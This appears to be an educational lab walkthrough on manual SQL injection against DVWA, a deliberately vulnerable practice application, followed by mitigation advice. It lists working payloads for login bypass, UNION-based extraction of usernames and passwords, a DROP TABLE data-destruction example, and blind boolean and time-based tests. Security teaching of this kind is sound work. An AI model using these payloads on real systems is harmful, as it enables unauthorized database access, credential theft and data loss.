---
title: Manual SQL Injection
date: 2024-01-09 08:01:35 +0300
subtitle: Product Design
image: '/images/809.png'
---
# Manual SQL Injection

## **Objective**
Understand how SQL injection vulnerabilities work and learn to manually exploit them to gain unauthorized access to a database, retrieve sensitive information, and understand remediation strategies.

---

## **Purpose**
SQL injection is one of the most critical and common vulnerabilities in web applications. This lab demonstrates how attackers can manipulate SQL queries to bypass authentication or access restricted data and teaches how to secure applications against such attacks.

---

## **Tools Required**
- **Kali Linux**: For testing and tools.
- A vulnerable web application (e.g., Damn Vulnerable Web Application - DVWA).

---

## **Lab Topology**
- **Kali Linux**: Hosting tools for SQL injection.
- **DVWA or Web Application**: Vulnerable to SQL injection attacks.

---

## **Walkthrough**

### **Task 1: Setting Up DVWA**
1. **Install DVWA**:
   - Follow [DVWA installation instructions](https://github.com/digininja/DVWA).
   - Host it on a local server (e.g., XAMPP, WAMP, or a Docker container).

2. **Access DVWA**:
   - Open a browser and navigate to:
     ```
     http://<dvwa_ip>/dvwa
     ```
   - Replace `<dvwa_ip>` with the IP address of the machine hosting DVWA.

3. **Login to DVWA**:
   - Default credentials:
     ```
     Username: admin
     Password: password
     ```

4. **Set Security Level**:
   - Navigate to **DVWA Security**.
   - Set the security level to **Low**.

---

### **Task 2: Understanding SQL Injection**
1. **What is SQL Injection?**
   - SQL injection occurs when an attacker manipulates SQL queries to access or modify a database.
   - Common SQL injection payloads include:
     - `' OR '1'='1` (bypasses login authentication).
     - `'; DROP TABLE users; --` (destroys data).

2. **Identify Vulnerable Inputs**:
   - Inputs such as login forms, search fields, or URL parameters are common attack vectors.

---

### **Task 3: Exploiting SQL Injection in DVWA**
1. **Navigate to the SQL Injection Module**:
   - In DVWA, click on the **SQL Injection** module from the navigation menu.

2. **Test for Vulnerability**:
   - Enter a simple payload in the input field:
     ```
     ' OR '1'='1
     ```
   - Click **Submit**.
   - If successful, the application bypasses authentication or displays unexpected results.

3. **Retrieve Data**:
   - Use UNION-based SQL injection to retrieve additional data from the database.
   - Example payload:
     ```
     ' UNION SELECT null, database(), user() --
     ```
   - Explanation:
     - `database()`: Displays the current database name.
     - `user()`: Displays the database user.

4. **Enumerate Tables**:
   - Identify tables in the database:
     ```
     ' UNION SELECT null, table_name FROM information_schema.tables --
     ```

5. **Extract Data from a Table**:
   - Retrieve data from a specific table (e.g., `users`):
     ```
     ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --
     ```
   - Extract sensitive data:
     ```
     ' UNION SELECT username, password FROM users --
     ```

---

### **Task 4: Testing Blind SQL Injection**
1. **What is Blind SQL Injection?**
   - Blind SQL injection occurs when the application does not return visible database errors but behaves differently based on the query.

2. **Boolean-Based Blind Injection**:
   - Test with a true condition:
     ```
     ' AND 1=1 --
     ```
   - Test with a false condition:
     ```
     ' AND 1=2 --
     ```
   - Observe differences in application behavior.

3. **Time-Based Blind Injection**:
   - Use SQL commands to introduce delays:
     ```
     ' OR IF(1=1, SLEEP(5), 0) --
     ```
   - If the application delays its response, it indicates a successful injection point.

---

### **Task 5: Mitigating SQL Injection**
1. **Input Validation**:
   - Validate and sanitize user inputs.
   - Reject inputs containing special SQL characters (e.g., `'`, `--`, `;`).

2. **Use Parameterized Queries**:
   - Replace dynamic queries with prepared statements:
     ```sql
     SELECT * FROM users WHERE username = ? AND password = ?
     ```

3. **Limit Database Privileges**:
   - Grant the application only the necessary permissions.
   - Avoid using database admin accounts.

4. **Error Handling**:
   - Suppress database error messages.
   - Display generic error messages to users.

---

## **Best Practices**
1. **Regularly Test Applications**:
   - Use tools like SQLmap to automate testing for SQL injection.

2. **Secure Development Practices**:
   - Incorporate security checks into the development lifecycle.

3. **Implement Web Application Firewalls (WAFs)**:
   - Use WAFs to detect and block SQL injection attempts.

4. **Educate Developers**:
   - Train developers on secure coding practices to prevent SQL injection vulnerabilities.

---

## **Key Takeaways**
1. SQL injection exploits improper validation of user inputs in SQL queries.
2. Manual exploitation techniques help understand the risks and impacts of SQL injection.
3. Implementing proper input validation and prepared statements is crucial for prevention.

---

## **Troubleshooting Tips**
1. **No Visible Results**:
   - Check for blind SQL injection by observing application behavior or using time-based techniques.

2. **Errors with UNION Queries**:
   - Ensure the number of columns matches between the original query and the injected query.
   - Use payloads like:
     ```
     ' UNION SELECT null, null, null --
     ```
     - Increment columns until no error occurs.

3. **DVWA Issues**:
   - Ensure the security level is set to **Low**.
   - Restart the web server if the application becomes unresponsive.

By completing this lab, you now understand how SQL injection vulnerabilities can be exploited manually and the best practices for securing applications against such attacks.